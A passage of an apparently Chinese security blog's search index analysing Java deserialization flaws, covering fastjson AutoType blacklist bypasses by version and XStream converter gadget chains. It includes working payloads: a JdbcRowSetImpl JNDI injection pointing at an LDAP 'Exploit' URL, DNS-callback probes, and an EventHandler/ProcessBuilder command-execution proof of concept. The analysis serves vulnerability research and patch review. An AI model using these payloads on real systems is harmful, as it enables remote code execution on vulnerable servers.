</ul>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#autotype","title":"\u5f00\u542f<code>AutoType</code>\u7684\u60c5\u51b5\u4e0b\u7ed5\u8fc7\u9ed1\u540d\u5355\u68c0\u6d4b","text":"<p>\u6839\u636e\u4e0a\u9762\u7684\u5206\u6790\uff0c\u5982\u679c\u5f00\u542f\u4e86<code>AutoType</code>\uff0c\u90a3\u4e48\u5982\u679c\u662f\u5728\u767d\u540d\u5355\u91cc\u7684\u7c7b\uff0c\u76f4\u63a5\u52a0\u8f7d\uff0c\u5bf9\u4e8e\u5728\u9ed1\u540d\u5355\u5185\u7684\u7c7b\u76f4\u63a5\u629b\u51fa\u5f02\u5e38\u3002</p> <p>\u800c\u9ed1\u540d\u5355\u7684\u68c0\u6d4b\u65b9\u5f0f\u662f\u53bb\u5339\u914d\u5f53\u524d\u7684\u7c7b\u540d<code>class.startsWith(deny)</code></p> <p></p> <p>\u800c\u5728\u8fd9\u4e2a\u9ed1\u540d\u5355\u91cc\u663e\u7136\u5e76\u6ca1\u6709\u8003\u8651\u5230<code>TypeUtils.loadClass</code>\u5b9e\u73b0\u4e2d\uff0c\u5bf9\u4e8e<code>Lxxxx.class.xxx;</code>\u7684\u5904\u7406\u3002</p> <p>\u901a\u8fc7<code>Lxxxxx;</code>\u7684\u65b9\u5f0f<code>startsWith</code>\u6ca1\u529e\u6cd5\u6b63\u5e38\u5339\u914d\u51fa\u6765\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u7ed5\u8fc7\u9ed1\u540d\u5355\u7684\u68c0\u6d4b\u3002</p>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#2-fastjson-1242","title":"(2). fastjson == 1.2.42","text":"<p>\u5728\u8fd9\u4e2a\u7248\u672c\uff0c\u5bf9\u4e0a\u9762\u7684\u9ed1\u540d\u5355\u68c0\u6d4b\u7ed5\u8fc7\u505a\u4e86\u4fee\u590d\uff0c\u5e76\u4e14\u5c06\u9ed1\u540d\u5355\u91cc\u7684\u7c7b\u578b\u8fdb\u884chash\u5904\u7406\uff0c\u589e\u52a0\u4e86\u5206\u6790\u96be\u5ea6\uff1b</p> <p>\u5bf9\u4e8e\u524d\u9762<code>Lxxxxx;</code>\u7684\u7ed5\u8fc7\uff0c42\u7248\u672c\u6dfb\u52a0\u4e86\u4ee5\u4e0b\u4ee3\u7801\u6765\u5254\u9664\uff08\u56e0\u4e3a\u9ed1\u540d\u5355\u5df2\u7ecf\u53d8\u6210\u4e86hash\u6bd4\u8f83\u7684\u65b9\u5f0f\uff0c\u8fd9\u91cc<code>L;</code>\u90fd\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u6765\u786e\u8ba4\uff09</p> <p></p> <p>\u4f46\u662f\u8fd9\u91cc\u7684\u5904\u7406\u6cbb\u6807\u4e0d\u6cbb\u672c\uff0c\u6211\u4eec\u4f7f\u7528<code>LLxxxxx;;</code>\u8fd9\u79cd\u65b9\u5f0f\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u3002</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u7531\u4e8e\u73b0\u5728\u7684\u9ed1\u540d\u5355\u53d8\u6210\u4e86hash\u8ba1\u7b97\u7684\u65b9\u5f0f\uff0c\u7ed9\u6211\u4eec\u5206\u6790\u589e\u52a0\u4e86\u4e0d\u5c11\u96be\u5ea6\uff0c\u4e0d\u8fc7\u6709\u5927\u4f6c\u5bf9\u9ed1\u540d\u5355hash\u505a\u4e86\u8fd8\u539f\u89c1fastjson-blacklist</p>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#3-fastjson-1243","title":"(3). fastjson == 1.2.43","text":"<p>\u8fd9\u4e2a\u7248\u672c\u4e3b\u8981\u4fee\u590d\u4e86\u4e0a\u9762<code>LLxxxx;;</code>\u7684\u65b9\u5f0f</p> <p></p> <p>\u505a\u4e86\u4e24\u6b21\u68c0\u6d4b\uff0c\u5982\u679c\u78b0\u4e0a<code>LLxxxxx;;</code>\u7684\u65b9\u5f0f\u5219\u76f4\u63a5\u7206\u51fa\u5f02\u5e38</p>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#4-fastjson-1248","title":"(4). fastjson == 1.2.48","text":"","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#_1","title":"\u4fee\u590d\u524d\u7684\u7248\u672c","text":"<p>\u572848\u7248\u672c\u4e4b\u524d\uff0c<code>checkAutoType</code>\u8fd8\u5b58\u5728\u8fd9\u6837\u4e00\u4e2a\u903b\u8f91\uff08\u4ee51.2.47\u4e3a\u4f8b\uff09</p> <p></p> <p>\u5f53\u5f00\u542f<code>AutoType</code>\u65f6\uff0c\u5982\u679cmappings\u91cc\u9762\u5b58\u5728\u8fd9\u4e2a\u7c7b\uff0c\u90a3\u4e48\u5c31\u7b97\u8fd9\u4e2a\u7c7b\u5728\u9ed1\u540d\u5355\u91cc\uff0c\u4e5f\u5141\u8bb8\u4ed6\u8fdb\u884c\u4e0b\u4e00\u6b65\u64cd\u4f5c</p> <p>PS\uff1a\u8fd9\u91cc\u7684mappings\u662ffastjson\u63d0\u65e9\u8f7d\u5165\u7684\u4e00\u4e9b\u7f13\u5b58\u7c7b</p> <p></p> <p>\u540e\u7eed\u5982\u679c\u80fd\u4ecemappings\u91cc\u9762\u5f97\u5230\u8fd9\u4e2a\u7c7b\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002\u90a3\u4e48\u6211\u4eec\u6709\u6ca1\u6709\u4ec0\u4e48\u65b9\u6cd5\u5c06\u6211\u4eec\u9700\u8981\u7684\u7c7b\u52a0\u5165\u5230\u8fd9\u4e2amappings\u91cc\u5462\uff1f</p> <p>\u5148\u6765\u770b\u4e00\u4e0b<code>deserializers.findClass</code>\uff0c\u5728<code>deserializers</code>\u91cc\u9762\u9884\u5148\u586b\u5145\u4e86\u4e00\u4e9b\u7c7b\u4e0e\u5176\u53cd\u5e8f\u5217\u5316\u5668\u7684\u5b9e\u4f8b</p> <p></p> <p>\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u4e00\u4e0b<code>Class.class</code>\uff0c\u4ed6\u6240\u5bf9\u5e94\u7684\u53cd\u5e8f\u5217\u5316\u5668\u4e3a<code>MiscCodec</code>\uff0c<code>checkAutoType</code>\u68c0\u6d4b\u8fc7\u540e\uff0c\u540e\u7eed\u5c06\u8c03\u7528\u53cd\u5e8f\u5217\u5316\u5668\u7684<code>deserialze</code>\u51fd\u6570\u3002\u6765\u770b\u770bMiscCodec\u7684\u8fd9\u4e2a\u51fd\u6570\u5bf9\u4e8e<code>Class.class</code>\u7684\u5904\u7406</p> <p></p> <p>\u4ed6\u8c03\u7528\u4e86<code>TypeUtils.loadClass</code>\u51fd\u6570\uff0c\u524d\u9762\u6211\u4eec\u8bb2\u8fc7\uff0c\u4ed6\u5c06\u4f7f\u7528<code>ClassLoader.loadClass</code>\u6216<code>Class.forName</code>\u6765\u8f7d\u5165\u7c7b\uff0c\u5728\u8fd9\u4e00\u8fc7\u7a0b\u4e2d\uff0c\u6d89\u53ca\u5230\u4e86<code>mappings</code>\u7684\u64cd\u4f5c</p> <p></p> <p></p> <p>\u8fd9\u91cc\u7684<code>cache</code>\u9ed8\u8ba4\u4e3a<code>true</code>\uff0c\u6240\u4ee5\u8fd9\u91cc\u4f1a\u76f4\u63a5\u5c06\u8f7d\u5165\u540e\u7684\u5bf9\u8c61\u586b\u5165<code>mappings</code></p> <p>\u6839\u636e\u6211\u4eec\u524d\u9762\u7684\u5206\u6790\uff0c\u5982\u679c\u5f53\u524d<code>mappings</code>\u91cc\u5b58\u5728\u53ef\u63a7\u7684\u7c7b\uff0c\u90a3\u4e48\u4e0d\u7ba1\u5f00\u6ca1\u5f00\u542f<code>AutoType</code>\uff0c\u90fd\u4f1a\u8fdb\u884c\u7c7b\u8fd8\u539f\uff1b\u540c\u65f6\u6211\u4eec\u5229\u7528<code>Class.class</code>\u53ef\u4ee5\u5411<code>mappings</code>\u586b\u5145\u4efb\u610f\u7c7b\uff0c\u8fd9\u5bfc\u81f4\u7ed5\u8fc7\u4e86\u524d\u9762\u7684\u68c0\u6d4b\uff1b</p> <pre><code>// \u4e3e\u4e2a\u4f8b\u5b50\njson = \"{\" + // \u7528Class\u8f7d\u5165com.sun.rowset.JdbcRowSetImpl\uff0c\u5e76\u7f13\u5b58\u5230mappings\n          \"{\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"},\" +\n                    // \u540e\u7eed\u4f7f\u7528mappings\u91cc\u7684com.sun.rowset.JdbcRowSetImpl\u6765\u8fd8\u539f\u5bf9\u8c61\n          \"{\\\"@type\\\": \\\"com.sun.rowset.JdbcRowSetImpl\\\",\" +\n          \"\\\"dataSourceName\\\": \\\"ldap://localhost:1389/Exploit\\\",\" +\n          \"\\\"autoCommit\\\": true}\" +\n        \"}\";\n</code></pre>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#_2","title":"\u4fee\u590d\u540e\u7684\u7248\u672c","text":"<p>\u57281.2.48\u7248\u672c\u4e0a\u5bf9\u5176\u8fdb\u884c\u4e86\u4fee\u590d</p> <p>\u5728<code>MiscCodec</code>\u5bf9Class\u7684\u5904\u7406\u4e2d\uff0c\u4fee\u6539\u4e86<code>cache=false</code></p> <p></p> <p>\u5e76\u4e14\u5bf9\u4e8e<code>TypeUtils.loadClass</code>\u91cc\u7684<code>mappings</code>\u64cd\u4f5c\u90fd\u4f9d\u8d56\u4e8e<code>cache</code>\uff0c\u5982\u679c\u4e3a<code>false</code>\u5219\u4e0d\u6dfb\u52a0\u5230<code>mappings</code>\u91cc\uff08\u5728\u524d\u9762\u7684\u7248\u672c\u91cc<code>Class.forName</code>\u90e8\u5206\u5e76\u4e0d\u4f9d\u8d56cache\uff0c48\u7248\u672c\u4e4b\u540e\u589e\u52a0\u4e86\u5bf9cache\u7684\u5224\u65ad\uff09</p> <p>\u4e0e\u6b64\u540c\u65f6\uff0c<code>java.lang.Class</code>\u4e5f\u88ab\u52a0\u5165\u5230\u4e86\u9ed1\u540d\u5355\u91cc\u9762</p>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#5","title":"(5). \u540e\u7eed\u7248\u672c","text":"<p>\u540e\u7eed\u7248\u672c\u7684\u7ed5\u8fc7\u4e3b\u8981\u56f4\u7ed5\u5728\uff1a</p> <ul> <li>\u5f00\u542f<code>AutoType</code>\uff0c\u7ed5\u8fc7\u9ed1\u540d\u5355\u68c0\u6d4b</li> <li>\u5229\u7528<code>deserializers</code>\u91cc\u9762\u7684\u7c7b(\u8ddf<code>Class.class</code>\u4e00\u4e2a\u539f\u7406)</li> </ul> <p>\u6700\u65b0\u72481.2.68\u5f15\u5165\u4e86safeMode\uff0c\u5728<code>checkAutoType</code>\u91cc\u6dfb\u52a0\u4e86\u4e0b\u9762\u5224\u65ad\uff0c\u5982\u679c\u5f00\u542f\u4e86safemode\uff0c\u90a3\u4e48\u5c06\u4e0d\u5141\u8bb8\u8fdb\u884c<code>@type</code></p> <p></p> <p>\u4e0d\u8fc7\u8fd9\u4e2a\u5e76\u4e0d\u662f\u9ed8\u8ba4\u5f00\u542f\u7684\uff0c\u9700\u8981\u4eba\u5de5\u53bb\u914d\u7f6e\u3002</p>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#6","title":"(6). \u540e\u7eed\u7248\u672c\u89c9\u5f97\u6709\u610f\u601d\u7684\u5229\u7528","text":"<ul> <li> <p>fastjson &lt; 1.2.60 dos Fastjson-1-2-60-Dos</p> </li> <li> <p>\u4f7f\u7528dnslog\u6765\u68c0\u6d4bfastjson\u6f0f\u6d1e https://github.com/alibaba/fastjson/issues/3077</p> </li> </ul> <p>\u8fd9\u91cc\u7684\u539f\u7406\u8ddf<code>Class.class</code>\u662f\u4e00\u6837\u7684\uff0c\u53ea\u662f\u6362\u6210\u4e86<code>java.net.URL</code>\u3001<code>java.net.Inet4Address</code>\u3001<code>java.net.Inet6Address</code>\uff0c\u7531MiscCodec\u5904\u7406\u65f6\u4f1a\u53bb\u89e6\u53d1dns\u67e5\u8be2</p> <p>\u5f53\u7136\u8fd9\u91cc\u7684\u89e6\u53d1URL\u7684\u89e6\u53d1\u7528\u7684ysoserial\u91cc\u9762\u7684URLDNS\u7684\u65b9\u5f0f\uff0c\u7531hashcode\u53bb\u89e6\u53d1\uff1b</p> <pre><code>{\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog\"}\n{\"@type\":\"java.net.Inet6Address\",\"val\":\"dnslog\"}\n{{\"@type\":\"java.net.URL\",\"val\":\"http://s81twxdise25yxjinqaar74iq9wzko.burpcollaborator.net\"}:\"aaa\"}\n</code></pre>","tags":["Java"]},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#0x04","title":"0x04 \u603b\u7ed3","text":"<p>\u5230\u8fd9\u91ccfastjson\u76f8\u5173\u7684\u77e5\u8bc6\u70b9\u5c31\u68b3\u7406\u7ed3\u675f\u4e86\uff0c\u8fd9\u5176\u4e2d\u5f00\u53d1\u8005\u4e0e\u5b89\u5168\u7814\u7a76\u4eba\u5458\u7684\u653b\u9632\u4ea4\u4e92\u771f\u662f\u4ee4\u4eba\u79f0\u5feb\uff01\u540e\u7eed\u5982\u679c\u6709\u5176\u4ed6\u7684\u7ed5\u8fc7\uff0c\u8fd8\u4f1a\u7ee7\u7eed\u5199\u4e0b\u53bb\u3002</p> <p>\u603b\u7ed3\u4e00\u4e0bfastjson\u5229\u7528\u4e2d\u7684\u7279\u8272\uff1a</p> <ul> <li>\u53cd\u5e8f\u5217\u5316\u65f6\u4e3b\u52a8\u89e6\u53d1\u7b26\u5408\u6761\u4ef6\u7684setters\u548cgetters\uff0c\u5176\u4e2d\u4f7f\u7528parse\u548cparseObject\u51fd\u6570\uff0c\u5728getter\u5229\u7528\u4e0aparseObject\u7684\u9650\u5236\u66f4\u4f4e\u4e00\u70b9\uff1b\u4f46\u662f\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u672c\u6587\u7684\u4e24\u79cd\u65b9\u6cd5\u5c06parse\u7684\u8c03\u7528\u6548\u679c\u8f6c\u5316\u4e3aparseObject</li> <li><code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>\u662f\u4e2a\u597d\u4e1c\u897f</li> <li>fastjson\u7684\u9ed1\u540d\u5355\u7ed5\u8fc7\u6765\u770b\uff0c\u57fa\u672c\u4e0a\u627e\u7684\u90fd\u662fjndi\u76f8\u5173\u7684\u5229\u7528\uff0c\u6216\u8bb8\u53ef\u4ee5\u6269\u5c55\u4e00\u4e9b\u5176\u4ed6\u7684\uff1f</li> <li>\u6709\u65f6\u5019\u5f00\u53d1\u8005\u7406\u89e3\u4e0d\u5230\u4f4d\uff0c\u6253\u5f97\u8865\u4e01\u53ef\u4ee5\u8f7b\u677e\u88ab\u7ed5\u8fc7\uff0c\u6240\u4ee5\u9700\u8981\u7d27\u76ef\u8865\u4e01\u7684\u60c5\u51b5</li> </ul>","tags":["Java"]},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/","title":"\u56de\u987eXStream\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":"","tags":["Java"]},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#0x00","title":"0x00 \u524d\u8a00","text":"<p>XStream\u4e5f\u662f\u4e00\u6b3e\u7528\u7684\u6bd4\u8f83\u591a\u7684\u5e8f\u5217\u5316\u7ec4\u4ef6\uff0c\u53ef\u4ee5\u5c06object\u8f6c\u5316\u4e3aXML\u5e76\u80fd\u5b8c\u6574\u7684\u8fd8\u539f\u56de\u6765\u3002\u4ed6\u4e5f\u66fe\u7ecf\u51fa\u73b0\u8fc7\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u672c\u6587\u4e3b\u8981\u6574\u7406XStream\u76f8\u5173\u7684\u5b89\u5168\u95ee\u9898XD</p>","tags":["Java"]},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#0x01","title":"0x01 \u57fa\u7840\u77e5\u8bc6","text":"<p>XStream\u7684\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u4e3b\u8981\u4f9d\u9760<code>toXML</code>\u51fd\u6570\u548c<code>fromXML</code>\u51fd\u6570\uff0c\u5982\u4e0b\u4ee3\u7801\u6240\u793a</p> <pre><code>Person person = new Person(\"tom\", 18);\nXStream xStream = new XStream();\nString xml = xStream.toXML(person);// object to xml\nSystem.out.println(xml);\nSystem.out.println(xStream.fromXML(xml)); // xml to object\n// \u8f93\u51fa\n// &lt;objects.Person&gt;\n//   &lt;name&gt;tom&lt;/name&gt;\n//   &lt;age&gt;18&lt;/age&gt;\n// &lt;/objects.Person&gt;\n// objects.Person@369f73a2\n</code></pre> <p>\u5173\u4e8eXStream\u7684fromXML\u5206\u6790\u770b\u8fd9\u7bc7\u6587\u7ae0\uff0cXStream\u4f1a\u53bb\u8c03\u7528\u4e0d\u540c\u7684Converters\u6765\u5904\u7406\u8fd8\u539f\u7684\u8fc7\u7a0b\u3002</p> <p>XStream\u53cd\u5e8f\u5217\u5316\u540cfastjson\u8fd9\u79cd\u4e0d\u4e00\u6837\u7684\u5730\u65b9\u662ffastjson\u4f1a\u5728\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u4e3b\u52a8\u53bb\u8c03\u7528getters\u548csetters\uff0c\u800cXStream\u7684\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\u8d4b\u503c\u90fd\u6709Java\u7684\u53cd\u5c04\u673a\u5236\u6765\u5b8c\u6210\uff0c\u6240\u4ee5\u5e76\u6ca1\u6709\u8fd9\u6837\u4e3b\u52a8\u8c03\u7528\u7684\u7279\u6027\u3002</p> <p>\u4f46\u662f\u8fd8\u6709\u4e00\u79cd\u5229\u7528\u65b9\u5f0f\uff0c\u56de\u60f3\u4e00\u4e0b\uff0c\u5728\u51e0\u6761\u5e38\u89c4\u7684java\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u4e0a\uff0c\u90fd\u5229\u7528\u4e86<code>HashMap</code>\u3001<code>PriorityQueue</code>\u7b49\u5bf9\u8c61\uff08key\u4e0d\u53ef\u91cd\u590d\u7b49\u7279\u6027\uff09\u4f1a\u81ea\u52a8\u53bb\u8c03\u7528<code>hashCode</code>\u3001<code>equal</code>\u3001<code>compareTo</code>\u7b49\u8fd9\u79cd\u51fd\u6570\u3002</p> <p>\u4ee5\u8fd9\u79cd\u60f3\u6cd5\u6765\u770bXStream\u53cd\u5e8f\u5217\u5316\uff0c\u5f53\u6211\u4eec\u5bf9Map\u8fd9\u79cd\u7c7b\u578b\u7684\u5bf9\u8c61\u8fdb\u884c\u8fd8\u539f\u7684\u65f6\u5019\uff0c\u662f\u5426\u4e5f\u540c\u6837\u4f1a\u53bb\u8c03\u7528\u4e0a\u9762\u63d0\u5230\u7684\u51e0\u79cd\u51fd\u6570\uff1f\u63a5\u4e0b\u6765\uff0c\u770b\u51e0\u4e2aConverter\u7684\u5904\u7406\uff1a</p>","tags":["Java"]},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#1-mapconverter","title":"1. MapConverter","text":"<p>\u6765\u770b\u770b\u9488\u5bf9Map\u7c7b\u578b\u8fd8\u539f\u7684Converter</p> <p><code>com.thoughtworks.xstream.converters.collections.MapConverter#unmarshal</code></p> <p></p> <p><code>populateMap</code>\u51fd\u6570\u4f1a\u53bb\u5904\u7406\u540e\u7eed\u7684\u503c\uff0c\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u6765\u770b\u5177\u4f53put\u7684\u5730\u65b9</p> <p><code>com.thoughtworks.xstream.converters.collections.MapConverter#putCurrentEntryIntoMap</code></p> <p></p> <p>\u8fd9\u91cctarget\u4f5c\u4e3a\u63a5\u6536\u8005\uff0c\u4f1a\u8c03\u7528Map\u7684put\u51fd\u6570\uff0c\u540e\u7eed\u5c31\u662f\u6211\u4eec\u719f\u6089\u7684\u5bf9key\u8c03\u7528hashCode\u51fd\u6570</p> <p></p>","tags":["Java"]},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#2-treesettreemapconverter","title":"2. TreeSet/TreeMapConverter","text":"<p>\u8fd9\u91ccTreeSet\u548cTreeMap\u4e00\u8d77\u8bb2\uff0c\u56e0\u4e3aTreeSet\u672c\u8eab\u5c31\u662f\u4e00\u4e2a\u53ea\u7528\u4e0a\u4e86Key\u7684TreeMap\uff1bTreeSetConverter\u7684\u53cd\u5e8f\u5217\u5316\u5904\u7406\u4e5f\u662f\u5148\u8f6c\u5316\u4e3aTreeMapConverter\u7684\u65b9\u5f0f\u6765\u4f18\u5148\u8fd8\u539fTreeSet\u91cc\u7684TreeMap\uff0c\u518d\u586b\u5145\u5230TreeSet\u91cc\u3002</p> <p>\u4eceTreeSetConverter\u6765\u8bb2</p> <p></p> <p>\u4ecetreeset\u4e2d\u53d6\u51fafield treemap\u540e\uff0c\u53bb\u8fdb\u4e00\u6b65\u8c03\u7528TreeMapConverter\u6765\u8fd8\u539fTreeMap</p> <p><code>com.thoughtworks.xstream.converters.collections.TreeMapConverter#populateTreeMap</code></p> <p></p> <p>\u8fd9\u91cc\u5148\u7528soredMap\u6765\u586b\u5145\u9700\u8981\u8fd8\u539f\u7684Entry\uff0c\u540e\u7eed\u5c06\u8c03\u7528<code>TreeMap.putAll</code></p> <p></p> <p>\u6700\u7ec8\u4f1a\u8c03\u7528\u5230<code>java.util.AbstractMap#putAll</code></p> <p></p> <p>\u8fd9\u91cc\u7684put\u51fd\u6570\u4e3a<code>TreeMap.put</code>,\u4e0d\u770b\u5177\u4f53\u7684\u4ee3\u7801\u4e86\uff0c\u4ed6\u7684\u4e3b\u8981\u529f\u80fd\u5c31\u662f\u586b\u5145\u6570\u636e\uff0c\u5e76\u4e14\u5728\u586b\u5145\u65f6\u5c06\u4f1a\u6bd4\u8f83\u5f53\u524d\u5b58\u5728key\uff0c\u5982\u679c\u662f\u76f8\u540c\u7684key\uff0c\u5219\u66ff\u6362\u539f\u6709\u8001\u7684\u503c\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u4f1a\u53bb\u8c03\u7528key\u7684<code>compareTo</code>\u51fd\u6570</p>","tags":["Java"]},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#3-dynamicproxyconverter","title":"3. DynamicProxyConverter","text":"<p>\u8fd8\u9700\u8981\u63d0\u53ca\u7684\u662fXStream\u8fd8\u652f\u6301\u5bf9\u52a8\u6001\u4ee3\u7406\u7684\u65b9\u5f0f\u8fdb\u884c\u8fd8\u539f</p> <p></p> <p>\u8fd9\u91cc\u7684\u8fd8\u539f\u8fc7\u7a0b\u4e0d\u8bf4\u4e86\uff0c\u6211\u4eec\u4e3b\u8981\u7684\u5173\u6ce8\u70b9\u662f\u4f7f\u7528Proxy\u52a8\u6001\u4ee3\u7406\uff0c\u6211\u4eec\u53ef\u4ee5\u6269\u5c55\u524d\u9762\u4e24\u79cd\u7684\u81ea\u52a8\u8c03\u7528\u51fd\u6570\u7684\u653b\u51fb\u9762\uff0c\u4e0b\u4e00\u7ae0\u4f1a\u4e3e<code>EventHandler</code>\u7684\u4f8b\u5b50</p>","tags":["Java"]},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#0x02","title":"0x02 \u73b0\u6709\u51e0\u79cd\u5229\u7528\u5206\u6790","text":"<p>\u7ed3\u5408\u4e0a\u9762\u57fa\u7840\u77e5\u8bc6\u4e2d\u63d0\u5230\u7684\u51e0\u4e2aConverter\uff0c\u6211\u4eec\u60f3\u8981\u5229\u7528XStream\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u8bdd\uff0c\u5f97\u53bb\u5145\u5206\u5229\u7528\u524d\u9762\u63d0\u5230\u7684\u51e0\u4e2a\u4f1a\u81ea\u52a8\u8c03\u7528\u7684\u51fd\u6570</p>","tags":["Java"]},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#1-eventhandler","title":"1. EventHandler","text":"<p>XStream\u53cd\u5e8f\u5217\u5316\u7528\u7684\u6700\u591a\u7684<code>EventHandler</code>\uff0c\u6765\u770b\u770b\u4ed6\u7684<code>invoke</code>\u51fd\u6570</p> <p></p> <p>\u4e3b\u8981\u5b9e\u73b0\u5728<code>invokeInternal</code>\u51fd\u6570\u5185</p> <p>\u9996\u5148\u9700\u8981\u5224\u65ad\u6b64\u65f6\u8c03\u7528\u7684\u51fd\u6570\u662f\u5426\u4e3a<code>hashCode</code>\u3001<code>equals</code>\u3001<code>toString</code>\uff0c\u5982\u679c\u662f\u7684\u8bdd\uff0c\u91c7\u7528\u4ee5\u4e0b\u7684\u65b9\u5f0f\u6765\u5904\u7406\u3002</p> <p></p> <p>\u4f46\u662f\u6211\u4eec\u9700\u8981\u5229\u7528\u7684\u662f<code>invokeInternal</code>\u51fd\u6570\u540e\u7eed\u7684\u90e8\u5206\uff0c\u6240\u4ee5\u6211\u4eec\u5229\u7528\u7684\u65f6\u5019\u4e0d\u80fd\u7528\u5b83\u6765\u8c03\u7528\u4e0a\u9762\u76843\u4e2a\u51fd\u6570\uff0c\u610f\u5473\u7740\u6211\u524d\u9762\u63d0\u5230\u7684<code>Map</code>\u7684\u65b9\u5f0f\uff0c\u4e0d\u9002\u5408\u7528\u5728\u8fd9\u4e2a\u5730\u65b9\uff1b\u800c<code>TreeSet</code>\u8fd9\u79cd\u8c03\u7528<code>compareTo</code>\u51fd\u6570\uff0c\u53ef\u4ee5\u7528\u6765\u7ee7\u7eed\u5f80\u4e0b\u8d70\u3002</p> <p>\u7ee7\u7eed\u5f80\u4e0b\u770b</p> <p></p> <p>\u540e\u7eed\u7684\u5c31\u662f\u7ecf\u5178\u7684java\u53cd\u5c04\u673a\u5236\u6765\u5b9e\u73b0\u51fd\u6570\u8c03\u7528\uff0c\u5e76\u4e14\u8fd9\u91cc\u7684target\u548caction\u90fd\u662f\u53ef\u63a7\u7684\u3002</p> <p>\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u4e00\u4e2a\u95ee\u9898\u662f\uff0c\u8fd9\u91ccaction\u51fd\u6570\u53c2\u6570\u662f\u6709\u8981\u6c42\u7684\uff08\u770b452\u884c\u5230461\u884c\uff09</p> <ol> <li>\u65e0\u53c2\u6570</li> <li>\u5355\u4e2a\u53c2\u6570\uff0c\u4e14\u53c2\u6570\u7684\u7c7b\u578b\u4e3a<code>Comparable</code>\uff0c\u5e76\u4e14\u8fd9\u4e2aaction\u51fd\u6570\u662f\u53ef\u5229\u7528\u7684</li> </ol> <p>\u7b2c2\u79cd\u8fd8\u6ca1\u6709\u627e\u5230\u8fd9\u6837\u53ef\u5229\u7528\u7684\u51fd\u6570\uff0c\u8fd9\u91cc\u7684\u7b2c\u4e00\u79cd\u53ef\u4ee5\u63d0\u4e24\u79cd\uff1a</p> <ul> <li>\u914d\u7f6e\u597dcmd\u7684<code>ProcessBuilder</code>\uff0caction\u586b<code>start</code></li> <li>\u914d\u7f6e\u597drmi url\u7684<code>JdbcRowSetImpl</code>\uff0caction\u586b<code>getDatabaseMetaData</code>\uff0c\u8fd9\u91cc\u53ef\u4ee5\u4e3e\u4e00\u53cd\u4e09\uff0c\u4e3b\u8981\u601d\u8def\u5c31\u662f\u53ef\u5229\u7528\u7684getters</li> </ul> <p>\u73b0\u5728\u518d\u6765\u770b\u770b\u5177\u4f53\u7684POC</p> <pre><code>&lt;sorted-set&gt;  \n  &lt;string&gt;foo&lt;/string&gt;\n  &lt;dynamic-proxy&gt; &lt;!-- Proxy \u52a8\u6001\u4ee3\u7406\uff0chandler\u4f7f\u7528EventHandler --&gt;\n    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n    &lt;handler class=\"java.beans.EventHandler\"&gt;\n      &lt;target class=\"java.lang.ProcessBuilder\"&gt;\n        &lt;command&gt;\n          &lt;string&gt;open&lt;/string&gt;\n          &lt;string&gt;/System/Applications/Calculator.app&lt;/string&gt;\n        &lt;/command&gt;\n      &lt;/target&gt;\n      &lt;action&gt;start&lt;/action&gt;\n    &lt;/handler&gt;\n  &lt;/dynamic-proxy&gt;\n&lt;/sorted-set&gt;\n</code></pre>","tags":["Java"]},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#2-groovy-convertedclosure","title":"2. Groovy ConvertedClosure","text":"<p>\u5229\u7528\u6761\u4ef6\uff1agroovy &lt;= 2.4.3\uff0c\u5728\u540e\u7eed\u7684\u7248\u672c\u91cc\uff0c<code>MethodClosure</code>\u4e0d\u5141\u8bb8\u53cd\u5e8f\u5217\u5316\u8c03\u7528\u3002</p> <p>\u9664\u4e86\u4e0a\u9762\u8fd9\u79cd<code>EventHandler</code>\u7684\u52a8\u6001\u4ee3\u7406\u65b9\u5f0f\uff0cGroovy\u7684<code>ConvertedClosure</code>\u4e5f\u540c\u6837\u53ef\u4ee5\u8fbe\u5230\u8fd9\u79cd\u6548\u679c</p>","tags":["Java"]},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/#methodclosure","title":"MethodClosure","text":"<p>\u5f53\u524dMethodClosure\u7684\u4e3b\u8981\u4f5c\u7528\u5c31\u662f\u5c01\u88c5\u6211\u4eec\u9700\u8981\u6267\u884c\u7684\u5bf9\u8c61\uff0c\u6bd4\u5982</p> <pre><code>new MethodClosure(Runtime.getRuntime(), \"exec\");\n</code></pre> 